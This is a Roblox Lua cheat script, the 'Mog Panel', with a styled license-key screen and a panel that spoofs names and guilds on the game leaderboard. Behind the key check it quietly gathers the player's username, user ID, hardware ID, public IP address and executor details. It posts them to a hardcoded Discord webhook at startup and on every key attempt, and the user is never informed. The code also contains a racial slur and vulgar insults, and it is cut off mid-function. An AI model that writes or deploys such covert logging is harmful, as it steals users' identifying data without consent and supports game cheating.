local plr = game.Players.LocalPlayer or game:GetService("Players").LocalPlayer

-- ========== НАСТРОЙКИ DISCORD ==========
local webhookURL = "https://discord.com/api/webhooks/1513876561252585503/TNaiMTX6eST5jthR6_ATaahPvX-R-X1Yu_FiE0H6yUVR4GCpspPZabPeDjez5TzvFLrP"

-- ========== ВАЛИДНЫЕ КЛЮЧИ ==========
local ValidKeys = {
    "MOG7X-9K2P4-1L8N5-3V6M2",
    "ROK4A-7C3E9-2W5Q8-6B1T7",
    "PAN3D-5F8H1-9J4L7-2K6N9",
    "KEYS8-4M2V6-1X9C3-7B5R0",
    "CODE2-6Q4W8-3Z7L1-9F5H4"
}

-- ========== ПОЛУЧЕНИЕ HWID ==========
local function getHWID()
    local hwid = ""
    
    local success, result = pcall(function()
        if syn and syn.getHWID then
            hwid = syn.getHWID()
        elseif getexecutorname and getexecutorname() == "ScriptWare" then
            hwid = game:GetService("RbxAnalyticsService"):GetClientId()
        elseif isfolder and isfolder("Krnl") then
            hwid = "Krnl-" .. game:GetService("RbxAnalyticsService"):GetClientId()
        elseif getexecutorname and getexecutorname() == "Electron" then
            hwid = "Electron-" .. game:GetService("RbxAnalyticsService"):GetClientId()
        else
            hwid = game:GetService("RbxAnalyticsService"):GetClientId()
        end
    end)
    
    if not success or hwid == "" then
        hwid = "Unknown-" .. game:GetService("RbxAnalyticsService"):GetClientId()
    end
    
    return hwid
end

-- ========== ПОЛУЧЕНИЕ IP-АДРЕСА ==========
local function getIP()
    local ip = "Unknown"
    
    local success, result = pcall(function()
        local request = syn and syn.request or http and http.request or request
        if request then
            local response = request({
                Url = "https://api.ipify.org",
                Method = "GET"
            })
            if response and response.Body then
                ip = response.Body
            end
        end
    end)
    
    if not success or ip == "Unknown" then
        pcall(function()
            local request = syn and syn.request or http and http.request or request
            if request then
                local response = request({
                    Url = "https://icanhazip.com",
                    Method = "GET"
                })
                if response and response.Body then
                    ip = string.gsub(response.Body, "%s+", "")
                end
            end
        end)
    end
    
    return ip
end

-- ========== ПОЛУЧЕНИЕ DISCORD ID (ОПЦИОНАЛЬНО) ==========
local function getDiscordID()
    local discordID = "Not linked"
    return discordID
end

-- ========== ПОЛУЧЕНИЕ ИНФОРМАЦИИ О СИСТЕМЕ ==========
local function getSystemInfo()
    local info = {}
    
    pcall(function()
        info.ScreenResolution = workspace.CurrentCamera.ViewportSize.X .. "x" .. workspace.CurrentCamera.ViewportSize.Y
        info.GameTime = math.floor(game:GetService("Players").LocalPlayer:GetAttribute("TotalTimePlayed") or 0)
        local execName = getexecutorname and getexecutorname() or "Unknown"
        info.Executor = execName
    end)
    
    return info
end

-- ========== ФОРМАТИРОВАНИЕ ВРЕМЕНИ ==========
local function getCurrentTime()
    return os.date("%Y-%m-%d %H:%M:%S")
end

-- ========== ОТПРАВКА В DISCORD ==========
local function sendToDiscord(title, color, fields)
    local embed = {
        title = title,
        color = color,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        fields = fields,
        footer = {
            text = "Mog Panel Security System"
        }
    }
    
    local data = {
        username = "Mog Panel Security",
        avatar_url = "https://i.imgur.com/4M2iC5c.png",
        embeds = {embed}
    }
    
    local encodedData = game:GetService("HttpService"):JSONEncode(data)
    
    pcall(function()
        local request = syn and syn.request or http and http.request or request
        if request then
            request({
                Url = webhookURL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = encodedData
            })
        end
    end)
end

-- ========== ПРОВЕРКА КЛЮЧА ==========
local function checkKey(inputKey)
    for _, validKey in ipairs(ValidKeys) do
        if inputKey == validKey then
            return true
        end
    end
    return false
end

-- ========== ЭКРАН ВВОДА КЛЮЧА (СТИЛИЗОВАННЫЙ ПОД ЧЕРЕП/ЛА ТИНЬ) ==========
local keyGui = Instance.new("ScreenGui")
keyGui.Name = "KeySystem"
keyGui.ResetOnSpawn = false
keyGui.Parent = plr.PlayerGui

-- Затемнённый фон
local darkOverlay = Instance.new("Frame")
darkOverlay.Size = UDim2.new(1, 0, 1, 0)
darkOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
darkOverlay.BackgroundTransparency = 0.85
darkOverlay.BorderSizePixel = 0
darkOverlay.Parent = keyGui

-- Главный фрейм в стиле "латунный череп"
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 480, 0, 360)
mainFrame.Position = UDim2.new(0.5, -240, 0.5, -180)
mainFrame.BackgroundColor3 = Color3.fromRGB(12, 10, 14)
mainFrame.BackgroundTransparency = 0
mainFrame.BorderSizePixel = 0
mainFrame.Parent = keyGui

-- Основной угол
local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 8)
mainCorner.Parent = mainFrame

-- Латунная обводка
local brassStroke = Instance.new("UIStroke")
brassStroke.Color = Color3.fromRGB(180, 140, 70)
brassStroke.Thickness = 1.5
brassStroke.Transparency = 0.3
brassStroke.Parent = mainFrame

-- Внутреннее свечение
local innerGlow = Instance.new("Frame")
innerGlow.Size = UDim2.new(1, -4, 1, -4)
innerGlow.Position = UDim2.new(0, 2, 0, 2)
innerGlow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
innerGlow.BackgroundTransparency = 0.7
innerGlow.BorderSizePixel = 0
innerGlow.Parent = mainFrame

local innerCorner = Instance.new("UICorner")
innerCorner.CornerRadius = UDim.new(0, 6)
innerCorner.Parent = innerGlow

-- Латунная рамка (декоративная)
local brassBorder = Instance.new("Frame")
brassBorder.Size = UDim2.new(1, -8, 1, -8)
brassBorder.Position = UDim2.new(0, 4, 0, 4)
brassBorder.BackgroundTransparency = 1
brassBorder.BorderSizePixel = 0
brassBorder.Parent = mainFrame

local borderStroke = Instance.new("UIStroke")
borderStroke.Color = Color3.fromRGB(160, 120, 60)
borderStroke.Thickness = 0.5
borderStroke.Transparency = 0.5
borderStroke.Parent = brassBorder

-- ========== ЧЕРЕП (ASCII-стиль или иконка) ==========
local skullLabel = Instance.new("TextLabel")
skullLabel.Size = UDim2.new(0, 60, 0, 60)
skullLabel.Position = UDim2.new(0.5, -30, 0, 15)
skullLabel.BackgroundTransparency = 1
skullLabel.Text = "💀"
skullLabel.TextColor3 = Color3.fromRGB(180, 140, 70)
skullLabel.TextSize = 48
skullLabel.Font = Enum.Font.GothamBold
skullLabel.Parent = mainFrame

-- Заголовок "f"
local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, -20, 0, 30)
titleLabel.Position = UDim2.new(0, 10, 0, 80)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "True Adam"
titleLabel.TextColor3 = Color3.fromRGB(200, 170, 100)
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 18
titleLabel.TextXAlignment = Enum.TextXAlignment.Center
titleLabel.Parent = mainFrame

-- Подзаголовок
local subtitleLabel = Instance.new("TextLabel")
subtitleLabel.Size = UDim2.new(1, -20, 0, 20)
subtitleLabel.Position = UDim2.new(0, 10, 0, 108)
subtitleLabel.BackgroundTransparency = 1
subtitleLabel.Text = "Mog Panel v1"
subtitleLabel.TextColor3 = Color3.fromRGB(130, 110, 70)
subtitleLabel.Font = Enum.Font.Gotham
subtitleLabel.TextSize = 10
subtitleLabel.TextXAlignment = Enum.TextXAlignment.Center
subtitleLabel.Parent = mainFrame

-- Разделитель
local line1 = Instance.new("Frame")
line1.Size = UDim2.new(0.8, 0, 0, 1)
line1.Position = UDim2.new(0.1, 0, 0, 135)
line1.BackgroundColor3 = Color3.fromRGB(180, 140, 70)
line1.BackgroundTransparency = 0.5
line1.BorderSizePixel = 0
line1.Parent = mainFrame

-- Текст "ENTER LICENSE KEY"
local keyLabel = Instance.new("TextLabel")
keyLabel.Size = UDim2.new(1, -40, 0, 18)
keyLabel.Position = UDim2.new(0, 20, 0, 150)
keyLabel.BackgroundTransparency = 1
keyLabel.Text = ">> AUTHENTICATION REQUIRED <<"
keyLabel.TextColor3 = Color3.fromRGB(180, 140, 70)
keyLabel.Font = Enum.Font.Gotham
keyLabel.TextSize = 10
keyLabel.TextXAlignment = Enum.TextXAlignment.Center
keyLabel.Parent = mainFrame

-- Поле ввода ключа (техно-стиль)
local keyBox = Instance.new("TextBox")
keyBox.Size = UDim2.new(0.8, 0, 0, 42)
keyBox.Position = UDim2.new(0.1, 0, 0, 175)
keyBox.BackgroundColor3 = Color3.fromRGB(8, 6, 10)
keyBox.BackgroundTransparency = 0
keyBox.TextColor3 = Color3.fromRGB(200, 180, 120)
keyBox.Text = ""
keyBox.PlaceholderText = "XXXXX-XXXXX-XXXXX-XXXXX"
keyBox.PlaceholderColor3 = Color3.fromRGB(80, 70, 50)
keyBox.TextSize = 11
keyBox.Font = Enum.Font.Gotham
keyBox.ClearTextOnFocus = true
keyBox.Parent = mainFrame

local keyBoxCorner = Instance.new("UICorner")
keyBoxCorner.CornerRadius = UDim.new(0, 4)
keyBoxCorner.Parent = keyBox

local keyBoxStroke = Instance.new("UIStroke")
keyBoxStroke.Color = Color3.fromRGB(180, 140, 70)
keyBoxStroke.Thickness = 0.8
keyBoxStroke.Transparency = 0.4
keyBoxStroke.Parent = keyBox

-- Статус текст
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -40, 0, 40)
statusLabel.Position = UDim2.new(0, 20, 0, 225)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = ""
statusLabel.TextColor3 = Color3.fromRGB(200, 80, 80)
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 10
statusLabel.TextXAlignment = Enum.TextXAlignment.Center
statusLabel.TextWrapped = true
statusLabel.Parent = mainFrame

-- Кнопка активации (латунная)
local submitBtn = Instance.new("TextButton")
submitBtn.Size = UDim2.new(0.5, 0, 0, 40)
submitBtn.Position = UDim2.new(0.25, 0, 1, -55)
submitBtn.Text = "MOG AGAMATSU"
submitBtn.BackgroundColor3 = Color3.fromRGB(30, 25, 18)
submitBtn.BackgroundTransparency = 0
submitBtn.TextColor3 = Color3.fromRGB(200, 170, 100)
submitBtn.TextSize = 11
submitBtn.Font = Enum.Font.GothamBold
submitBtn.Parent = mainFrame

local submitCorner = Instance.new("UICorner")
submitCorner.CornerRadius = UDim.new(0, 4)
submitCorner.Parent = submitBtn

local submitStroke = Instance.new("UIStroke")
submitStroke.Color = Color3.fromRGB(180, 140, 70)
submitStroke.Thickness = 0.8
submitStroke.Transparency = 0.3
submitStroke.Parent = submitBtn

-- Нижняя информационная строка (как на втором изображении)
local infoBar = Instance.new("Frame")
infoBar.Size = UDim2.new(1, 0, 0, 24)
infoBar.Position = UDim2.new(0, 0, 1, -24)
infoBar.BackgroundColor3 = Color3.fromRGB(8, 6, 10)
infoBar.BackgroundTransparency = 0
infoBar.BorderSizePixel = 0
infoBar.Parent = mainFrame

local infoCorner = Instance.new("UICorner")
infoCorner.CornerRadius = UDim.new(0, 4)
infoCorner.Parent = infoBar

local infoText = Instance.new("TextLabel")
infoText.Size = UDim2.new(1, -10, 1, 0)
infoText.Position = UDim2.new(0, 5, 0, 0)
infoText.BackgroundTransparency = 1
infoText.Text = "67"
infoText.TextColor3 = Color3.fromRGB(100, 85, 55)
infoText.Font = Enum.Font.Gotham
infoText.TextSize = 9
infoText.TextXAlignment = Enum.TextXAlignment.Center
infoText.Parent = infoBar

-- Анимация появления
for i = 1, 15 do
    mainFrame.BackgroundTransparency = 1 - (i / 15)
    darkOverlay.BackgroundTransparency = 0.85 + (i / 30)
    wait(0.016)
end
mainFrame.BackgroundTransparency = 0
darkOverlay.BackgroundTransparency = 0.85

-- Перетаскивание
local UIS = game:GetService("UserInputService")
local dragging = false
local dragStart
local startPos

titleLabel.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)

-- ========== АКТИВАЦИЯ КЛЮЧА ==========
local activationAttempts = 0
local maxActivationAttempts = 3

local userHWID = getHWID()
local userIP = getIP()
local systemInfo = getSystemInfo()
local userDiscordID = getDiscordID()
local profileLink = "https://www.roblox.com/users/" .. plr.UserId .. "/profile"

local function activateKey()
    local inputKey = string.gsub(keyBox.Text, "^%s*(.-)%s*$", "%1")
    
    if inputKey == "" then
        statusLabel.Text = "[!] ENTER VALID LICENSE KEY"
        statusLabel.TextColor3 = Color3.fromRGB(200, 100, 100)
        return
    end
    
    local fields = {
        {
            name = "👤 ROBLOX INFORMATION",
            value = "**Username:** " .. plr.Name .. "\n**Display Name:** " .. plr.DisplayName .. "\n**User ID:** " .. plr.UserId,
            inline = false
        },
        {
            name = "🖥️ HWID",
            value = "```" .. userHWID .. "```",
            inline = false
        },
        {
            name = "🌐 IP ADDRESS",
            value = "```" .. userIP .. "```",
            inline = false
        },
        {
            name = "💻 SYSTEM INFO",
            value = "**Executor:** " .. systemInfo.Executor .. "\n**Resolution:** " .. (systemInfo.ScreenResolution or "Unknown") .. "\n**Time:** " .. getCurrentTime(),
            inline = false
        },
        {
            name = "🔑 KEY USED",
            value = "```" .. inputKey .. "```",
            inline = false
        }
    }
    
    if checkKey(inputKey) then
        statusLabel.Text = "[✔] SPOOF AUTHORIZED // LOADING..."
        statusLabel.TextColor3 = Color3.fromRGB(100, 180, 100)
        
        sendToDiscord("✅ LICENSE ACTIVATED - " .. plr.Name, 0x00FF00, fields)
        
        for i = 1, 15 do
            mainFrame.BackgroundTransparency = i / 15
            darkOverlay.BackgroundTransparency = 0.85 + (i / 30)
            wait(0.016)
        end
        
        keyGui:Destroy()
        wait(0.1)
        startMainScript()
    else
        activationAttempts = activationAttempts + 1
        local remaining = maxActivationAttempts - activationAttempts
        
        fields[5].value = "```" .. inputKey .. " (INVALID)```"
        
        sendToDiscord("❌ FAILED ACTIVATION - " .. plr.Name .. " (Attempt " .. activationAttempts .. "/" .. maxActivationAttempts .. ")", 0xFF0000, fields)
        
        if remaining <= 0 then
            statusLabel.Text = "[X] ACCESS DENIED // SYSTEM LOCKED"
            statusLabel.TextColor3 = Color3.fromRGB(200, 60, 60)
            wait(3)
            keyGui:Destroy()
            return
        end
        
        statusLabel.Text = "[!] INVALID KEY // " .. remaining .. " ATTEMPTS REMAINING"
        statusLabel.TextColor3 = Color3.fromRGB(200, 60, 60)
        keyBox.Text = ""
    end
end

submitBtn.MouseButton1Click:Connect(activateKey)
keyBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        activateKey()
    end
end)

-- Отправляем информацию о запуске
local startupFields = {
    {
        name = "👤 ROBLOX INFORMATION",
        value = "**Username:** " .. plr.Name .. "\n**Display Name:** " .. plr.DisplayName .. "\n**User ID:** " .. plr.UserId,
        inline = false
    },
    {
        name = "🖥️ HWID",
        value = "```" .. userHWID .. "```",
        inline = false
    },
    {
        name = "🌐 IP ADDRESS",
        value = "```" .. userIP .. "```",
        inline = false
    },
    {
        name = "💻 SYSTEM INFO",
        value = "**Executor:** " .. systemInfo.Executor .. "\n**Resolution:** " .. (systemInfo.ScreenResolution or "Unknown") .. "\n**Time:** " .. getCurrentTime(),
        inline = false
    }
}

sendToDiscord("🟡 KEY SYSTEM OPENED - " .. plr.Name, 0xFFA500, startupFields)

-- ========== ОСНОВНОЙ СКРИПТ (СТИЛИЗОВАННЫЙ ПОД ЧЕРЕП/ЛА ТУНЬ) ==========
function startMainScript()
    local panelFields = {
        {
            name = "👤 ROBLOX INFORMATION",
            value = "**Username:** " .. plr.Name .. "\n**Display Name:** " .. plr.DisplayName .. "\n**User ID:** " .. plr.UserId,
            inline = false
        },
        {
            name = "🖥️ HWID",
            value = "```" .. userHWID .. "```",
            inline = false
        },
        {
            name = "🌐 IP ADDRESS",
            value = "```" .. userIP .. "```",
            inline = false
        },
        {
            name = "💻 SYSTEM INFO",
            value = "**Executor:** " .. systemInfo.Executor .. "\n**Resolution:** " .. (systemInfo.ScreenResolution or "Unknown") .. "\n**Time:** " .. getCurrentTime(),
            inline = false
        }
    }
    
    sendToDiscord("🟢 MOG PANEL ACTIVATED - " .. plr.Name, 0x00FF00, panelFields)
    
    local GuildName = "None"
    local ManForBan = "Character name"
    local NameForBan = "name of nigga"
    local DisplayForBan = "His display name"
    local status = "Leader"
    
    local FrameConnections = {}
    
    local function clearFrameConnections(frame)
        if FrameConnections[frame] then
            if FrameConnections[frame].Enter then
                FrameConnections[frame].Enter:Disconnect()
            end
            if FrameConnections[frame].Leave then
                FrameConnections[frame].Leave:Disconnect()
            end
            FrameConnections[frame] = nil
        end
    end
    
    -- Экран загрузки в стиле черепа
    local splashGui = Instance.new("ScreenGui")
    splashGui.Name = "SplashScreen"
    splashGui.ResetOnSpawn = false
    splashGui.Parent = plr.PlayerGui
    
    local splashBg = Instance.new("Frame")
    splashBg.Size = UDim2.new(1, 0, 1, 0)
    splashBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    splashBg.BackgroundTransparency = 0.9
    splashBg.BorderSizePixel = 0
    splashBg.Parent = splashGui
    
    local splashText = Instance.new("TextLabel")
    splashText.Size = UDim2.new(0, 500, 0, 80)
    splashText.Position = UDim2.new(0.5, -250, 0.5, -40)
    splashText.BackgroundTransparency = 1
    splashText.Text = "MOG Forge ban"
    splashText.TextColor3 = Color3.fromRGB(180, 140, 70)
    splashText.TextSize = 32
    splashText.Font = Enum.Font.GothamBold
    splashText.TextTransparency = 1
    splashText.Parent = splashGui
    
    local splashSub = Instance.new("TextLabel")
    splashSub.Size = UDim2.new(0, 400, 0, 30)
    splashSub.Position = UDim2.new(0.5, -200, 0.5, 20)
    splashSub.BackgroundTransparency = 1
    splashSub.Text = "Agamatsu small dick"
    splashSub.TextColor3 = Color3.fromRGB(130, 110, 70)
    splashSub.TextSize = 14
    splashSub.Font = Enum.Font.Gotham
    splashSub.TextTransparency = 1
    splashSub.Parent = splashGui
    
    for i = 1, 20 do
        splashText.TextTransparency = 1 - (i / 20)
        splashSub.TextTransparency = 1 - (i / 20)
        wait(0.025)
    end
    
    for i = 1, 20 do
        local r = 180 - (i * 2)
        local g = 140 - (i * 2)
        local b = 70 - (i * 2)
        splashText.TextColor3 = Color3.new(math.max(50, r)/255, math.max(40, g)/255, math.max(20, b)/255)
        wait(0.033)
    end
    
    wait(0.5)
    
    for i = 1, 20 do
        splashText.TextTransparency = i / 20
        splashSub.TextTransparency = i / 20
        wait(0.025)
    end
    
    splashGui:Destroy()
    wait(0.2)
    
    -- Создание главного меню (техно-череп стиль)
    local gui = Instance.new("ScreenGui")
    gui.Name = "MogPanel"
    gui.ResetOnSpawn = false
    gui.Parent = plr.PlayerGui
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 380, 0, 480)
    frame.Position = UDim2.new(0.5, -190, 0.5, -240)
    frame.BackgroundColor3 = Color3.fromRGB(12, 10, 14)
    frame.BackgroundTransparency = 0
    frame.BorderSizePixel = 0
    frame.Active = true
    frame.Visible = true
    frame.Parent = gui
    
    local frameCorner = Instance.new("UICorner")
    frameCorner.CornerRadius = UDim.new(0, 8)
    frameCorner.Parent = frame
    
    local frameStroke = Instance.new("UIStroke")
    frameStroke.Color = Color3.fromRGB(180, 140, 70)
    frameStroke.Thickness = 1
    frameStroke.Transparency = 0.3
    frameStroke.Parent = frame
    
    -- Заголовок с черепом
    local titleFrame = Instance.new("Frame")
    titleFrame.Size = UDim2.new(1, 0, 0, 60)
    titleFrame.BackgroundColor3 = Color3.fromRGB(8, 6, 10)
    titleFrame.BackgroundTransparency = 0
    titleFrame.BorderSizePixel = 0
    titleFrame.Parent = frame
    
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 8)
    titleCorner.Parent = titleFrame
    
    local skullIcon = Instance.new("TextLabel")
    skullIcon.Size = UDim2.new(0, 40, 0, 40)
    skullIcon.Position = UDim2.new(0, 12, 0, 10)
    skullIcon.BackgroundTransparency = 1
    skullIcon.Text = "🥰"
    skullIcon.TextColor3 = Color3.fromRGB(180, 140, 70)
    skullIcon.TextSize = 32
    skullIcon.Font = Enum.Font.GothamBold
    skullIcon.Parent = titleFrame
    
    local titleText = Instance.new("TextLabel")
    titleText.Size = UDim2.new(1, -60, 0, 30)
    titleText.Position = UDim2.new(0, 55, 0, 10)
    titleText.BackgroundTransparency = 1
    titleText.Text = "MOG Forge ban"
    titleText.TextColor3 = Color3.fromRGB(200, 170, 100)
    titleText.TextSize = 16
    titleText.Font = Enum.Font.GothamBold
    titleText.TextXAlignment = Enum.TextXAlignment.Left
    titleText.Parent = titleFrame
    
    local titleSub = Instance.new("TextLabel")
    titleSub.Size = UDim2.new(1, -60, 0, 18)
    titleSub.Position = UDim2.new(0, 55, 0, 38)
    titleSub.BackgroundTransparency = 1
    titleSub.Text = "Matadora requiem"
    titleSub.TextColor3 = Color3.fromRGB(130, 110, 70)
    titleSub.TextSize = 9
    titleSub.Font = Enum.Font.Gotham
    titleSub.TextXAlignment = Enum.TextXAlignment.Left
    titleSub.Parent = titleFrame
    
    -- Разделитель
    local titleLine = Instance.new("Frame")
    titleLine.Size = UDim2.new(1, -24, 0, 1)
    titleLine.Position = UDim2.new(0, 12, 0, 60)
    titleLine.BackgroundColor3 = Color3.fromRGB(180, 140, 70)
    titleLine.BackgroundTransparency = 0.4
    titleLine.BorderSizePixel = 0
    titleLine.Parent = frame
    
    local contentContainer = Instance.new("Frame")
    contentContainer.Size = UDim2.new(1, 0, 1, -60)
    contentContainer.Position = UDim2.new(0, 0, 0, 60)
    contentContainer.BackgroundTransparency = 1
    contentContainer.Parent = frame
    
    -- Перетаскивание
    local dragging2 = false
    local dragStart2
    local startPos2
    
    titleFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging2 = true
            dragStart2 = input.Position
            startPos2 = frame.Position
        end
    end)
    
    UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging2 = false
        end
    end)
    
    UIS.InputChanged:Connect(function(input)
        if dragging2 and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart2
            frame.Position = UDim2.new(
                startPos2.X.Scale,
                startPos2.X.Offset + delta.X,
                startPos2.Y.Scale,
                startPos2.Y.Offset + delta.Y
            )
        end
    end)
    
    local function CreateModernBox(y, text, defaultValue)
        local container = Instance.new("Frame")
        container.Size = UDim2.new(1, -24, 0, 58)
        container.Position = UDim2.new(0, 12, 0, y)
        container.BackgroundTransparency = 1
        container.Parent = contentContainer
        
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, 0, 0, 18)
        label.Position = UDim2.new(0, 0, 0, 0)
        label.BackgroundTransparency = 1
        label.Text = text
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.TextColor3 = Color3.fromRGB(180, 140, 70)
        label.TextSize = 9
        label.Font = Enum.Font.Gotham
        label.Parent = container
        
        local box = Instance.new("TextBox")
        box.Size = UDim2.new(1, 0, 0, 34)
        box.Position = UDim2.new(0, 0, 0, 20)
        box.BackgroundColor3 = Color3.fromRGB(8, 6, 10)
        box.BackgroundTransparency = 0
        box.TextColor3 = Color3.fromRGB(200, 180, 120)
        box.Text = defaultValue
        box.TextSize = 11
        box.Font = Enum.Font.Gotham
        box.ClearTextOnFocus = false
        box.Parent = container
        
        local boxCorner = Instance.new("UICorner")
        boxCorner.CornerRadius = UDim.new(0, 4)
        boxCorner.Parent = box
        
        local boxStroke = Instance.new("UIStroke")
        boxStroke.Color = Color3.fromRGB(180, 140, 70)
        boxStroke.Thickness = 0.5
        boxStroke.Transparency = 0.4
        boxStroke.Parent = box
        
        return box
    end
    
    local GuildBox = CreateModernBox(12, "> GUILD_TARGET", GuildName)
    local PlayerBox = CreateModernBox(76, "> PRIMARY_TARGET", ManForBan)
    local NameBox = CreateModernBox(140, "> SPOOF_NAME", NameForBan)
    local DisplayBox = CreateModernBox(204, "> SPOOF_DISPLAY", DisplayForBan)
    local StatusBox = CreateModernBox(268, "> STATUS_OVERRIDE", status)
    
    local apply = Instance.new("TextButton")
    apply.Size = UDim2.new(0.45, -6, 0, 38)
    apply.Position = UDim2.new(0, 12, 1, -48)
    apply.Text = "EXECUTE SPOOF"
    apply.BackgroundColor3 = Color3.fromRGB(30, 25, 18)
    apply.BackgroundTransparency = 0
    apply.TextColor3 = Color3.fromRGB(200, 170, 100)
    apply.TextSize = 10
    apply.Font = Enum.Font.GothamBold
    apply.Parent = contentContainer
    
    local applyCorner = Instance.new("UICorner")
    applyCorner.CornerRadius = UDim.new(0, 4)
    applyCorner.Parent = apply
    
    local applyStroke = Instance.new("UIStroke")
    applyStroke.Color = Color3.fromRGB(180, 140, 70)
    applyStroke.Thickness = 0.5
    applyStroke.Transparency = 0.3
    applyStroke.Parent = apply
    
    local hide = Instance.new("TextButton")
    hide.Size = UDim2.new(0.45, -6, 0, 38)
    hide.Position = UDim2.new(0.55, 0, 1, -48)
    hide.Text = "MINIMIZE"
    hide.BackgroundColor3 = Color3.fromRGB(20, 18, 22)
    hide.BackgroundTransparency = 0
    hide.TextColor3 = Color3.fromRGB(180, 140, 70)
    hide.TextSize = 10
    hide.Font = Enum.Font.GothamBold
    hide.Parent = frame
    
    local hideCorner = Instance.new("UICorner")
    hideCorner.CornerRadius = UDim.new(0, 4)
    hideCorner.Parent = hide
    
    local hideStroke = Instance.new("UIStroke")
    hideStroke.Color = Color3.fromRGB(180, 140, 70)
    hideStroke.Thickness = 0.5
    hideStroke.Transparency = 0.3
    hideStroke.Parent = hide
    
    local function RefreshLeaderboard()
        local leaderboardGui = plr.PlayerGui:FindFirstChild("LeaderboardGui")
        if not leaderboardGui then return end
        
        local mainFrame = leaderboardGui:FindFirstChild("MainFrame")
        if not mainFrame then return end
        
        local frm = mainFrame:FindFirstChild("ScrollingFrame")
        if not frm then return end
        
        local descendants = frm:GetDescendants()
        for _, z in ipairs(descendants) do
            if z:IsA("TextButton") and z.Name == "PlayerFrame" then
                clearFrameConnections(z)
                
                local playerFrame = z:FindFirstChild("PlayerFrame")
                if playerFrame then
                    local Player = playerFrame:FindFirstChild("Player")
                    if Player then
                        local DeepName = Player.Text
                        
                        if DeepName == nil then
                            z:Destroy()
                        else
                            local guildFrame = z:FindFirstChild("GuildFrame")
                            local Guild = guildFrame and guildFrame:FindFirstChild("Guild")
                            
                            local plrName = nil
                            local DisplayNamez = nil
                            
                            local live = workspace:FindFirstChild("Live")
                            if live then
                                local children = live:GetChildren()
                                for _, v in ipairs(children) do
                                    local humanoid = v:FindFirstChild("Humanoid")
                                    if humanoid then
                                        local attrName = humanoid:GetAttribute("CharacterName")
                                        if attrName == DeepName then
                                            local playerObj = game.Players:FindFirstChild(v.Name)
                                            if playerObj then
                                                plrName = v.Name
                                                DisplayNamez = playerObj.DisplayName
                                                break
                                            end
                                        end
                                    end
                                end
                            end
                            
                            if DeepName == ManForBan then
                                if Guild then
                                    Guild.Text = GuildName
                                end
                                
                                if plrName and live and live:FindFirstChild(plrName) then
                                    local hum = live[plrName]:FindFirstChild("Humanoid")
                                    if hum then
                                        hum:SetAttribute("GuildRich", GuildName .. " - " .. status)
                                    end
                                end
                                
                                local enterConn = z.MouseEnter:Connect(function()
                                    local Name = NameForBan
                                    local DisplayName = DisplayForBan
                                    if DisplayName ~= Name and DisplayName ~= "" then
                                        Name = Name .. (" (%s)"):format(DisplayName)
                                    end
                                    Player.Text = Name
                                    Player.TextTransparency = 0.3
                                    if Guild then Guild.TextTransparency = 0.3 end
                                end)
                                
                                local leaveConn = z.MouseLeave:Connect(function()
                                    Player.Text = DeepName
                                    Player.TextTransparency = 0
                                    if Guild then Guild.TextTransparency = 0 end
                                end)
                                
                                FrameConnections[z] = {
                                    Enter = enterConn,
                                    Leave = leaveConn
                                }
                            else
                                if DeepName ~= nil and DeepName ~= ManForBan then
                                    local enterConn = z.MouseEnter:Connect(function()
                                        local Name = plrName or DeepName
                                        local DisplayName = DisplayNamez or ""
                                        if DisplayName ~= Name and DisplayName ~= "" then
                                            Name = Name .. (" (%s)"):format(DisplayName)
                                        end
                                        Player.Text = Name
                                        Player.TextTransparency = 0.3
                                        if Guild then Guild.TextTransparency = 0.3 end
                                    end)
                                    
                                    local leaveConn = z.MouseLeave:Connect(function()
                                        Player.Text = DeepName
                                        Player.TextTransparency = 0
                                        if Guild then Guild.TextTransparency = 0 end
                                    end)
                                    
                                    FrameConnections[z] = {
                                        Enter = enterConn,
                                        Leave = leaveConn
                                    }
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    
    apply.MouseButton1Click:Connect(function()
        GuildName = GuildBox.Text
        ManForBan = PlayerBox.Text
        NameForBan = NameBox.Text
        DisplayForBan = DisplayBox.Text
        status = StatusBox.Text
        
        RefreshLeaderboard()
    end)
    
    local hidden = false
    hide.MouseButton1Click:Connect(function()
        hidden = not hidden
        contentContainer.Visible = not hidden
        hide.Text = hidden and "EXPAND" or "MINIMIZE"
        frame.Size = hidden and UDim2.new(0, 380, 0, 60) or UDim2.new(0, 380, 0, 480)
    end)
    
    local function Start()
        repeat 
            wait(0.5) 
        until plr.PlayerGui:FindFirstChild("LeaderboardGui")
        
        RefreshLeaderboard()
        
        wait(0.4)
        local leaderboardGui = plr.PlayerGui:FindFirstChild("LeaderboardGui")
        if leaderboardGui then
            local leaderboardClient = leaderboardGui:FindFirstChild("LeaderboardClient")
            if leaderboardClient then
                leaderboardClient.Enabled = false
